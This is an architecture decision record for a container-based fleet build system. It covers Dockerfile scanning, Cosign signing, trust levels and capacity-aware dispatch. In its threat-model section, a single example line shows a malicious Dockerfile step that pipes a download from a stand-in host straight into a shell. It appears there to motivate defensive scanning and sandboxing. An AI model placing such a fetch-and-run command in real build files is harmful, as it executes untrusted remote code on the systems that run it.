# ADR-017: Fleet Builds — Container-Based Cross-Platform Build, Test, and Distribution

## Status
Draft

## Design Criteria

Four criteria govern every decision in this ADR. They are not trade-offs — all four must be satisfied simultaneously.

### 1. Containers only: all fleet work runs in Docker containers

No bare-metal execution on fleet instances. Every dispatched build, test, or validation runs inside a container built from a Dockerfile. The Dockerfile IS the artifact. The container IS the sandbox. This is the same model as GitHub Actions runners — ephemeral, isolated, reproducible. There is no command allowlist because there are no bare-metal commands. The only thing fleet dispatch does is `docker build` + `docker run` with a validated Dockerfile.

### 2. Security: validated and scanned before distribution

Nothing runs on a fleet machine unless the Dockerfile has passed a concrete scanning pipeline and been cryptographically signed. The pipeline is: lint (Hadolint) → dependency audit (Trivy + cargo-audit) → image scan (Trivy) → SBOM generation (Syft) → signing (Cosign) → verification (Cosign + Grype). Every tool is open source, runs locally, and produces auditable output. An unscanned Dockerfile does not exist to the fleet.

### 3. Opportunistic capacity: fleet work is the lowest-priority work

Fleet dispatch never competes with a developer's own sessions. Capacity is scavenged, not allocated. If a developer is active or has consumed more than 30% of their Claude subscription window, their instance is unavailable for fleet work. On a team, light agentic users contribute idle capacity that heavy users' fleet builds consume.

### 4. Path normalization: cross-platform operations require canonical paths

No cross-platform operation is reliable without consistent path representation. Symlinks, path separators, drive letter casing, Unicode normalization, and URI encoding all produce platform-specific representations of the same file. This is a security prerequisite — path confusion enables validation bypass and filter evasion.

## Framing

*How does a fleet of nmem instances, running on heterogeneous platforms, share validated container images for cross-platform build and test — without allowing unscanned code to propagate, without executing anything outside a container, and without competing with developers' own work?*

This is a **coordination problem** (VSM S2) governed by **trust policy** (VSM S5). ADR-015 provides the pipes — NATS, mothership, identity. Fleet Builds defines what flows through those pipes: **Dockerfiles, container images, and scan attestations.**

The adversarial angles:

**Against bare-metal dispatch:** "What if we just run `cargo test` directly on the remote machine?" Then the remote machine's filesystem, credentials, and environment are exposed. One malicious command in a dispatched task compromises the instance. Containers eliminate this class of attack. The cost is Docker as a dependency on every fleet instance — but Docker is already present on any machine doing builds.

**Against trust-on-push:** "What if Alice pushes a Dockerfile that passes Hadolint but contains `RUN curl evil.com | sh`?" The image scan (Trivy) catches known malicious packages. The SBOM (Syft) inventories everything installed. The container sandbox limits blast radius. And the validation chain means someone must build and run the image before it's trusted — the malicious payload executes in a sandboxed container during validation, not on bare metal.

**Against scan-as-theater:** "What if the scanning pipeline gives false confidence?" Scans catch known CVEs, not zero-days. The defense is defense-in-depth: container isolation (limits blast radius) + scanning (catches known issues) + signing (proves provenance) + validation chain (requires execution to succeed). No single layer is sufficient; together they raise the cost of attack beyond the value of the target.

## Depends On
- ADR-015 (Fleet Beacon) — NATS infrastructure, mothership blob store, identity model, opt-in distribution, response envelope protocol
- ADR-016 (Direct Inference) — feature flags (cuda, rocm, metal) that create the platform matrix
- ADR-007 (Trust Boundary and Secrets Filtering) — secret filtering extends to Dockerfile content before distribution

## Unlocks
- Cross-platform CI without CI runners: fleet instances ARE the test matrix
- Effort discovery: "who already solved this build problem?"
- Reproducible builds: same Dockerfile, same container, any machine
- Integration with GitHub Actions, Forgejo/Gitea Actions (same container model)
- RALPH loop for build intelligence: recognize failure → search fleet → learn recipe → predict applicability

---

## Context

### The session that surfaced this

A macOS LSP test hung in CI for 54 minutes. Root cause: macOS `/var` → `/private/var` symlink. To diagnose, we SSH'd from a Windows dev machine to a Mac on the LAN — bare metal, ad hoc, no sandboxing, no audit trail beyond nmem observations on the Windows side. This worked, but it's not reproducible, not secure, and not reusable.

The broader pattern: nmem ships CPU, CUDA, ROCm, and Metal builds across Linux x86_64, Linux aarch64, macOS ARM64, and Windows x86_64. Each cell has platform-specific gotchas discovered through hours of debugging — all captured as nmem observations, none packaged as reusable artifacts.

| Platform | Gotchas discovered |
|----------|-------------------|
| Windows | `\\?\` UNC paths, drive letter casing (`c:` vs `C:`), separator `\` vs `/`, MSYS `/c/` mount prefix |
| macOS | `/var` → `/private/var` symlink, NFD Unicode, Metal framework on headless CI |
| Linux CUDA | `CMAKE_POSITION_INDEPENDENT_CODE=ON`, `cublas_dev` sub-package |
| Linux ROCm | `linker = "gcc"` workaround, `HSA_OVERRIDE_GFX_VERSION` |
| Windows CUDA | LLVM for `libclang`, `CMAKE_GENERATOR=Ninja`, MSVC dev env |

Every gotcha should be a Dockerfile. Every Dockerfile should be scanned, signed, and distributed.

---

## Architecture

Three layers. Each builds on the last.

### Layer 1: Path Normalization (prerequisite)

A shared utility that canonicalizes all paths at system boundaries. Benefits local operations (LSP, git, repo map) independently of fleet features.

**Crates:** `dunce` (canonicalize without `\\?\`), `url` (URI→path per RFC 8089), `path-slash` (separator normalization).

**Pipeline:** URI parse → separator normalize → drive letter uppercase → canonicalize → strip trailing slash.

**Issues from real data** (collected from nmem observations on Windows and macOS):

| # | Issue | Platform | Observed in |
|---|-------|----------|-------------|
| 1 | `fs::canonicalize()` returns `\\?\` UNC paths | Windows | Rust stdlib |
| 2 | Drive letter `c:` vs `C:` | Windows | Claude Code sends `c:`, git2/canonicalize return `C:` |
| 3 | `/var` → `/private/var` symlink | macOS | `tempfile::TempDir` returns `/var/`, `current_dir()`/git2 return `/private/var/` |
| 4 | git2 returns forward slashes, OS returns backslashes | Windows | `git rev-parse` returns `C:/`, `getcwd()` returns `C:\` |
| 5 | MSYS mount prefix `/c/Users/` vs native `C:/Users/` | Windows | nmem observations contain both styles in the same DB |
| 6 | Unicode NFD vs NFC in filenames | macOS | `café.rs` is 7 bytes NFC, 8 bytes NFD |
| 7 | `canonicalize()` fails if path doesn't exist | All | Soft fallback needed |
| 8 | LSP URIs: `file:///c%3A/` with encoded colon, leading `/` after parse | Windows + VSCode | `urllib.parse` gives `/c:/path` with leading slash |

**Security relevance:** Path normalization prevents validation bypass via path confusion and secret filter evasion via path mismatch.

### Layer 2: Dockerfiles (the artifact)

The only artifact type in fleet builds is the Dockerfile. Not scripts, not configs, not test harnesses — Dockerfiles. Everything else goes inside the Dockerfile.

A build script becomes a `RUN` instruction. A config snippet becomes a `COPY`. A test harness becomes an `ENTRYPOINT`. The Dockerfile is the unit of composition, validation, scanning, signing, and distribution.

**Why only Dockerfiles:**
- **Single trust boundary.** One artifact type, one scanning pipeline, one execution model. No "what kind of artifact is this and how do I validate it?" decisions.
- **Container = sandbox.** No bare-metal execution, ever. The container boundary enforces credential isolation, filesystem isolation, and network isolation without convention.
- **Reproducible.** Same Dockerfile, same `docker build`, same result. Platform-specific behavior is inside the container, not on the host.
- **CI-native.** GitHub Actions and Forgejo both execute in containers. Fleet builds use the same model — a Dockerfile validated locally works in CI and vice versa.

#### Scanning pipeline

Every Dockerfile passes through a six-stage pipeline before it can be distributed. Each stage produces auditable output. The pipeline runs locally on the author's machine and again on each validating instance.

```
Dockerfile
    ↓
┌─────────────────────────────────────────────────┐
│ Stage 1: LINT (Hadolint)                        │
│   Static analysis of Dockerfile                 │
│   ShellCheck integration for RUN instructions   │
│   Catches: unpinned base images, anti-patterns, │
│   shell bugs, running as root                   │
│   Gate: must pass with zero errors              │
│   Tool: hadolint (Apache 2.0 / GPL-3.0 CLI)    │
└─────────────────────────────────────────────────┘
    ↓ pass
┌─────────────────────────────────────────────────┐
│ Stage 2: DEPENDENCY AUDIT (Trivy fs + cargo-audit)│
│   Scan Cargo.lock for known CVEs                │
│   Trivy: NVD + GitHub Advisory + OS vendor DBs  │
│   cargo-audit: RustSec Advisory DB              │
│   Gate: zero critical/high CVEs                 │
│   Tools: trivy (Apache 2.0), cargo-audit (MIT)  │
└─────────────────────────────────────────────────┘
    ↓ pass
┌─────────────────────────────────────────────────┐
│ Stage 3: BUILD + IMAGE SCAN (docker build + Trivy)│
│   Build the image from the Dockerfile           │
│   Scan built image for OS + runtime CVEs        │
│   For scratch/distroless: minimal attack surface │
│   Gate: zero critical/high CVEs in image        │
│   Tools: docker (Apache 2.0), trivy (Apache 2.0)│
└─────────────────────────────────────────────────┘
    ↓ pass
┌─────────────────────────────────────────────────┐
│ Stage 4: SBOM (Syft)                            │
│   Generate Software Bill of Materials           │
│   CycloneDX format — the inventory for re-scan  │
│   Captures: all packages, versions, sources     │
│   Rust binary metadata if debug info present    │
│   Tool: syft (Apache 2.0)                       │
└─────────────────────────────────────────────────┘
    ↓
┌─────────────────────────────────────────────────┐
│ Stage 5: SIGN (Cosign)                          │
│   Cryptographic signature over image digest     │
│   Keyless in CI (GitHub OIDC), key-based local  │
│   Attach SBOM + scan results as attestations    │
│   Tool: cosign (Apache 2.0)                     │
└─────────────────────────────────────────────────┘
    ↓
┌─────────────────────────────────────────────────┐
│ Stage 6: SECRET SCAN (ADR-007 SecretFilter)     │
│   nmem's regex + entropy patterns on Dockerfile │
│   Catches: API keys, tokens, credentials        │
│   Runs before push — local S5 boundary          │
│   Gate: zero secrets detected                   │
│   Tool: nmem s5_filter (existing)               │
└─────────────────────────────────────────────────┘
    ↓ all pass
  Push to mothership (Dockerfile + image + attestations)
```

**Rust-specific note:** Static musl builds produce binaries that run from `FROM scratch` — zero OS packages, zero OS CVEs. For nmem, the Trivy image scan (Stage 3) will find nothing in the final image. The primary attack surface is Cargo.lock (Stage 2). This is by design — minimal images have minimal attack surface.

#### Trust levels

Every Dockerfile has exactly one of four trust levels. Trust is monotonic — it can only increase, never decrease without re-validation.

| Level | Name | Who can see | Who can run | How to reach |
|-------|------|------------|-------------|-------------|
| **0** | Draft | Author only | Author only | `nmem fleet create` |
| **1** | Scanned + Signed | Fleet (metadata only) | Author only | Pipeline passes all 6 stages + author signs |
| **2** | Validated | Fleet (full content) | Instances that validated | ≥1 instance builds + runs + passes pipeline on their platform |
| **3** | Fleet-validated | Fleet (full content) | All validated platforms | Validated on ≥N distinct platforms (default 2) |

**Level 0 → 1:** Author's scanning pipeline passes all six stages. Author signs the image digest with their identity (GitHub-linked key from ADR-015). The signature proves: this person ran this pipeline, it passed, at this time.

**Level 1 → 2:** The signed Dockerfile is pushed to the mothership. Fleet instances can see metadata. Any instance that pulls, builds, re-runs the full pipeline on their platform, and succeeds adds a validation record. The image becomes runnable on platforms where it has been validated.

**Level 2 → 3:** Accumulates validations on N distinct platforms (default 2). Fleet-validated — eligible for automated dispatch.

**Invariant: no execution without per-platform validation.** An image validated on `linux/amd64` and `darwin/arm64` is NOT runnable on `windows/amd64`. Fleet-validated means "trusted on platforms that have validated it," not "trusted everywhere."

#### Validation chain

```
Author creates Dockerfile
    ↓
Author runs scanning pipeline (6 stages) → all pass
    ↓
Author signs: Cosign(image_digest, author_identity)
  + attaches: SBOM attestation, scan results attestation
    ↓
Push to mothership: Dockerfile + image + attestations
    ↓
Fleet instance pulls → verifies Cosign signature
    ↓
Instance re-runs full scanning pipeline on own platform → all pass
    ↓
Instance signs own validation: Cosign(image_digest, instance_identity)
    ↓
Validation record pushed to mothership
    ↓
Image accumulates validation chain:
  [author@darwin/arm64:PASS, bob@linux/amd64:PASS, ci@windows/amd64:PASS]
  Each entry: {validator, platform, pipeline_results, signature, timestamp, sbom_hash}
```

The chain is append-only. Failed validations stay in the chain — they're signal, not noise. Each entry is independently verifiable.

**Re-scanning:** When new CVEs are disclosed, any instance can re-scan the SBOM (Grype against updated DB) without rebuilding. If a previously clean image now has a critical CVE, the fleet is notified via NATS. The image's trust level doesn't drop — but a `cve_alert` flag is set, and dispatch excludes flagged images until the Dockerfile is updated and re-validated.

#### Schema

```sql
CREATE TABLE fleet_images (
    id INTEGER PRIMARY KEY,
    dockerfile_path TEXT NOT NULL,       -- relative path within project
    image_tag TEXT NOT NULL UNIQUE,      -- e.g., "nmem-build-cuda:v3"
    image_digest TEXT NOT NULL,          -- SHA-256 of built image
    dockerfile_hash TEXT NOT NULL,       -- SHA-256 of Dockerfile content
    platform TEXT NOT NULL,              -- 'linux/amd64', 'darwin/arm64', 'windows/amd64'
    title TEXT,
    version INTEGER NOT NULL DEFAULT 1,
    created_at INTEGER NOT NULL,
    updated_at INTEGER,
    author TEXT NOT NULL,                -- GitHub username
    tags TEXT,                           -- JSON array: ["cuda", "build", "windows"]
    mothership_url TEXT,
    source TEXT NOT NULL DEFAULT 'local',

    -- Trust level (0-3)
    trust_level INTEGER NOT NULL DEFAULT 0,
    cve_alert INTEGER NOT NULL DEFAULT 0,  -- 1 if re-scan found new CVEs

    -- Scanning pipeline results (from author's initial scan)
    hadolint_result TEXT,                -- JSON: {passed: bool, warnings: [...]}
    trivy_dep_result TEXT,               -- JSON: {passed: bool, cves: [...]}
    trivy_image_result TEXT,             -- JSON: {passed: bool, cves: [...]}
    cargo_audit_result TEXT,             -- JSON: {passed: bool, advisories: [...]}
    sbom_hash TEXT,                      -- SHA-256 of CycloneDX SBOM
    sbom_url TEXT,                       -- mothership URL for SBOM artifact
    cosign_signature TEXT,               -- Cosign signature of image_digest

    -- Validation chain (append-only)
    validation_chain TEXT NOT NULL DEFAULT '[]',
    -- JSON array: [
    --   {"validator": "alice", "platform": "darwin/arm64", "result": "pass",
    --    "timestamp": 1774757000, "signature": "cosign(...)",
    --    "pipeline": {"hadolint": "pass", "trivy_dep": "pass", "trivy_image": "pass",
    --                 "cargo_audit": "pass", "sbom_hash": "abc...", "secrets": "pass"},
    --    "duration_ms": 45000}
    -- ]

    -- Provenance
    source_session_id TEXT,
    source_episode_id INTEGER,
    source_observations TEXT             -- JSON array of observation IDs
);

CREATE INDEX idx_fleet_images_trust ON fleet_images(trust_level);
CREATE INDEX idx_fleet_images_platform ON fleet_images(platform);
CREATE INDEX idx_fleet_images_digest ON fleet_images(image_digest);
CREATE INDEX idx_fleet_images_cve ON fleet_images(cve_alert);
```

### Layer 3: Fleet Dispatch (container orchestration)

The beacon distributes builds and tests across fleet instances. **All dispatched work runs inside containers.** The dispatch command is always the same: build the Dockerfile, run the resulting image, return the output.

```
nmem fleet run --platforms linux/amd64,darwin/arm64 nmem-test-metal:v2
```

The beacon:
1. Checks trust level (must be Level 3 for automated dispatch)
2. Checks capacity (usage histogram, active-session gate)
3. Selects eligible instances matching the requested platforms
4. Sends via NATS: image reference + run parameters
5. Each instance: `docker pull` → `docker run` → capture output → return via NATS
6. Beacon aggregates results

**What the container provides:**
- **Filesystem isolation.** The container has no access to the host's working directories, home directory, or credentials.
- **Credential isolation.** No SSH keys, no API tokens, no nmem encryption keys. The container gets only what the Dockerfile explicitly installs.
- **Network isolation.** Configurable: default is host networking (for builds that need to download dependencies), but `--network none` for pure computation.
- **Timeout.** `docker run --timeout 30m`. Container is killed after the limit.
- **Audit.** The dispatch is recorded as an observation on both sender and receiver.

**No command allowlist needed.** The container IS the allowlist. Whatever runs inside the container can't escape it. The Dockerfile defines the entire execution environment — and it's been scanned, signed, and validated.

#### Personal fleet

A developer's own machines form a personal fleet — a recursive layer below the org fleet. Same container model, relaxed trust constraints.

```toml
# ~/.nmem/config.toml
[fleet.personal]
enabled = true
instances = ["bpd10@windows", "bpd10@mac", "bpd10@linux"]
```

| Constraint | Org fleet | Personal fleet |
|-----------|-----------|----------------|
| Container required | Yes | Yes — same isolation model |
| Scanning pipeline | Full 6 stages | Author's choice (can skip for iteration) |
| Trust level for dispatch | Level 3 | Level 0+ (same identity, implicit trust) |
| Capacity ceiling | 30% | None — developer's own quota |
| Active-session gate | Yes | Optional |

The personal fleet is what we did manually (SSH from Windows to Mac) — but containerized, formalized, and captured as observations on both sides.

This is VSM recursion. The org fleet is a viable system. Each personal fleet is a viable system within it. Same container model at both levels — different S5 policy parameters.

---

## Capacity-Aware Dispatch

Fleet dispatch never competes with a developer's own work.

### Usage histogram

Every NATS response from every fleet instance includes a usage histogram — two 5-hour windows matching the Claude subscription structure. This is S2 coordination. It tells the fleet one thing: **who is available and who is not.**

```json
{
  "result": { ... },
  "capacity": {
    "window_current": {"usage_pct": 68, "active": true, "remaining_h": 2.3},
    "window_next":    {"usage_pct": 0,  "active": false, "starts_in_h": 2.3}
  }
}
```

Two windows. Three fields each. That's the entire signal.

- `active: true` → developer is working — **unavailable**
- `active: false, usage_pct: 0` → idle, fresh window — **available**
- `usage_pct: 68` → window mostly consumed — low headroom

The beacon reads the fleet's current state from responses it's already receiving. No dedicated heartbeat. On a team, light agentic users report `active: false` most of the time — their instances are available for fleet work almost always.

**ADR-015 implication:** The capacity block is part of the response envelope for ALL NATS reply messages. This benefits fleet search ranking too.

### The team-level picture

```
Instance          Platform         Active   Window Usage
alice@linux       linux/amd64      yes      82%        ← unavailable
bob@mac           darwin/arm64     no       12%        ← available
eve@windows       windows/amd64    no       3%         ← available (light user)
charlie@linux     linux/amd64      no       0%         ← available
dave@mac          darwin/arm64     yes      45%        ← unavailable

Dispatch eligible: bob@mac, eve@windows, charlie@linux
```

Heavy users consume their windows. Light users barely touch theirs. Fleet builds exploit the natural variance.

### Dispatch eligibility

**Gates** (binary, all must pass):
- Platform match (can't run Metal on Linux)
- Trust level ≥ 3 for org fleet dispatch
- `active: false` (never interrupt a developer)
- `usage_pct < 30` in current window (opportunistic baseline, configurable via `fleet.quota_ceiling`)
- Docker available on the instance

**Scoring** (when multiple instances pass all gates):

| Signal | Weight |
|--------|--------|
| Remaining window headroom | 0.4 |
| Current load (containers running) | 0.3 |
| Recent dispatch history | 0.3 |

---

## Effort Discovery

```
nmem fleet search "cuda windows build"
```

Before creating a new Dockerfile, search the fleet for prior effort:

1. **Local search** — FTS5 over `fleet_images` table
2. **Fleet search** — scatter/gather over NATS `nmem.{org}.fleet.search`
3. **Observation search** — search local+fleet observations for build commands matching the query

nmem knows someone spent time on a problem even without a packaged Dockerfile. "3 hours of CUDA debugging on Windows in session abc123" surfaces as a finding. The episode narrative (ADR-010) captures intent and outcome.

---

## Integration with CI Systems

Fleet builds and CI use the same model: containers. This makes integration natural.

**Fleet → CI:** A fleet-validated Dockerfile (Level 3) becomes a CI step:

```yaml
# Fleet-validated: nmem-build-cuda v3
# Chain: alice@darwin/arm64:PASS, bpd10@windows/amd64:PASS, ci@linux/amd64:PASS
# SBOM: sbom.cdx.json (attached via Cosign attestation)
jobs:
  build-cuda:
    runs-on: ubuntu-latest
    container:
      image: ghcr.io/viablesys/nmem-build-cuda:v3
    steps:
      - uses: actions/checkout@v4
      - run: cargo build --release --features cuda
```

**CI → Fleet:** CI failures become nmem observations that trigger effort discovery.

**Forgejo/Gitea Actions:** Same container model. The Dockerfile works in both systems — only the workflow YAML wrapper differs.

---

## VSM Mapping

| Layer | Current (ADR-015) | Extended (Fleet Builds) |
|-------|-------------------|------------------------|
| **S1 Operations** | Query federation, RAG distribution | + Container image storage, build observation capture |
| **S2 Coordination** | NATS message routing | + Platform capability matching, capacity-aware dispatch |
| **S3 Control** | Fleet maintenance policies | + Image retention governed by trust level, CVE alert lifecycle |
| **S3* Audit** | Mothership as canonical store | + Scanning pipeline results, SBOM archive, validation chain verification |
| **S4 Intelligence** | Cross-instance synthesis, ensemble research | + Effort discovery, build pattern detection, RALPH loop |
| **S5 Policy** | Org boundary, opt-in | + Container-only execution, scanning pipeline gates, trust levels, capacity ceiling |

### S5 as the Governing System

In fleet builds, **S5 becomes active**:

- **S4 wants to distribute:** S5 asks: "Did the scanning pipeline pass? Is it signed? On which platforms validated?" Only Level 2+ images pass.
- **S2 wants to dispatch:** S5 asks: "Is the target available? Usage below ceiling? Docker present?" The container requirement is non-negotiable.
- **S1 wants to execute:** S5 says: "Container only. No bare metal. No exceptions."
- **S3 wants to forget:** S5 says: "Trust level IS the retention signal. CVE-flagged images get shorter retention."
- **S3\* wants to audit:** S5 says: "Re-scan SBOMs against updated CVE databases. Flag regressions."

### S4: The RALPH Loop

1. **Recognize** — Build/test failure. S2 classifies as `command` with `friction` label.
2. **Act** — Search fleet for prior Dockerfiles and observation history.
3. **Learn** — Extract solution as Dockerfile. Run scanning pipeline. Sign.
4. **Predict** — Suggest relevant validated Dockerfiles for new platform+dependency combinations.
5. **Hypothesize** — "The macOS path fix probably also affects FreeBSD." Suggested task — but the Dockerfile must still be validated on the new platform.

### S3: Retention Governed by Trust

| Trust level | Retention | Rationale |
|-------------|-----------|-----------|
| Level 3 (fleet-validated) | 730 days | Highest value — multi-platform proof |
| Level 2 (validated) | 365 days | Proven on ≥1 platform |
| Level 1 (scanned + signed) | 180 days | Author-tested, not fleet-proven |
| Level 0 (draft) | 30 days | Local-only |
| CVE-flagged (any level) | 30 days | Must be updated and re-validated |

---

## Open Questions

### Q1: Docker on macOS — Linux containers only?
Docker Desktop on macOS runs Linux containers in a VM. Native macOS binaries (Metal, Apple frameworks) can't run in a Linux container on macOS. Does this limit macOS fleet builds to Linux-target cross-compilation? Or do we need a macOS-native exception to the container-only rule for Metal builds?

### Q2: Image registry
Where do built images live? Options: (a) mothership as OCI registry (adds complexity), (b) push to GitHub Container Registry (GHCR) with Cosign signatures, (c) distribute Dockerfiles only, each instance builds locally. Option (c) is simplest and most aligned with "Dockerfile is the artifact" — but slower (each instance rebuilds).

### Q3: Key management for Cosign
Keyless signing (Fulcio + Rekor) in CI is clean. Local signing needs key-based Cosign. Where do private keys live? System keyring? nmem-managed? How does this relate to ADR-015's GitHub-linked Ed25519 keys?

### Q4: Artifact extraction from observations
`nmem fleet create --from-session <id>` implies generating a Dockerfile from a sequence of build commands. Can S4 automate this? Auto-generated Dockerfiles start at Level 0 regardless — they must still pass the full pipeline.

### Q5: Multi-arch images
`docker buildx` can produce multi-arch images (linux/amd64 + linux/arm64 in one manifest). Does fleet builds use multi-arch manifests, or separate single-arch images? Multi-arch is cleaner but adds buildx complexity.

### Q6: CVE re-scan frequency
How often should SBOMs be re-scanned against updated vulnerability databases? On every fleet query response? Daily via dispatch? On-demand only?

### Q7: Claude usage tracking mechanism
How does an instance know its `usage_pct` within the current subscription window? Passive tracking from hook invocations is preferred — no additional API calls.

### Q8: macOS/Windows container support
Docker on macOS = Linux containers in a VM. Docker on Windows = Linux containers in WSL2 (or Windows containers, rarely used). Are Windows-native builds (MSVC, CUDA on Windows) even possible in containers? May need Windows container support or a native exception.

---

## Consequences

### Positive
- **Container boundary eliminates bare-metal risk.** No credential exposure, no filesystem access, no "what if the dispatched command is malicious" — the container IS the sandbox.
- **Concrete scanning pipeline.** Six stages, all open source, all local, all auditable. Not "validate somehow" but "Hadolint → Trivy → cargo-audit → Syft → Cosign → SecretFilter."
- **Same model as CI.** Fleet builds use containers. GitHub Actions uses containers. A fleet-validated Dockerfile works in CI and vice versa.
- **Effort is never wasted twice.** A platform fix becomes a Dockerfile, scanned, signed, distributed.
- **Trust is explicit.** Every image has a scanning pipeline result and a validation chain.
- **No quota competition.** 30% ceiling + active-session gate.
- **SBOM enables re-scanning.** When new CVEs drop, re-scan without rebuilding.
- **VSM coherent.** S5 governs actively. S3* audits via SBOM + re-scan. S4 discovers via observation search.

### Negative
- **Docker is a hard dependency.** Every fleet instance must have Docker installed. Not all dev machines do.
- **macOS/Windows native builds.** Metal and CUDA-on-Windows may not be buildable inside Linux containers. Q1 and Q8 are blocking questions.
- **Build time.** Each validating instance rebuilds the image from the Dockerfile. For large images (CUDA), this is slow. Cached layers help but the first build is expensive.
- **Scanning pipeline overhead.** Six stages adds minutes to every validation. For iteration speed in a personal fleet, this matters.
- **Image storage.** Container images are large (100s of MB for CUDA). Mothership storage costs increase. If each instance builds locally, storage is distributed but network bandwidth increases.
- **Scope.** Container orchestration + scanning pipeline + image signing + SBOM + CVE monitoring is a significant system. Where does nmem end?

## References

- ADR-007 — Trust Boundary and Secrets Filtering (S5 filtering on Dockerfile content)
- ADR-015 — Fleet Beacon (NATS, mothership, identity, response envelope)
- ADR-016 — Direct Inference (feature flags creating the platform matrix)
- VSM.md — S4 intelligence, S3 control, S5 mediation
- Trivy — https://aquasecurity.github.io/trivy (Apache 2.0, image + fs + config scanning)
- Hadolint — https://github.com/hadolint/hadolint (GPL-3.0 CLI, Dockerfile linting + ShellCheck)
- Syft — https://github.com/anchore/syft (Apache 2.0, SBOM generation)
- Grype — https://github.com/anchore/grype (Apache 2.0, SBOM-based vulnerability scanning)
- Cosign — https://github.com/sigstore/cosign (Apache 2.0, container signing + attestation)
- cargo-audit — https://github.com/rustsec/rustsec (Apache 2.0 / MIT, RustSec advisory DB)
- SLSA — https://slsa.dev (supply chain security levels framework)
- dunce — https://docs.rs/dunce (Windows canonicalize without UNC)
- url — https://docs.rs/url (RFC 8089 file URI handling)
- path-slash — https://docs.rs/path-slash (separator normalization)

## Revision History

| Date | Version | Changes |
|------|---------|---------|
| 2026-03-29 | 2.0 | Full rewrite — container-first architecture. Four design criteria: containers only, security (scanning pipeline), opportunistic capacity, path normalization. Dockerfile is the only artifact type — everything else goes inside. Six-stage scanning pipeline: Hadolint → Trivy fs + cargo-audit → Trivy image → Syft SBOM → Cosign signing → SecretFilter. All tools open source, all run locally. Trust levels map to pipeline + signing + cross-platform validation. Container = sandbox: no bare-metal execution, no command allowlists (container IS the allowlist). SBOM enables re-scanning for new CVEs without rebuilding. Schema redesigned for container images. Personal fleet uses same container model with relaxed trust constraints. Capacity: usage histogram in every NATS response, 30% ceiling, active-session gate. New open questions: macOS/Windows native builds in containers (Metal, CUDA), image registry, multi-arch. CI integration natural — same container model as GitHub Actions. |
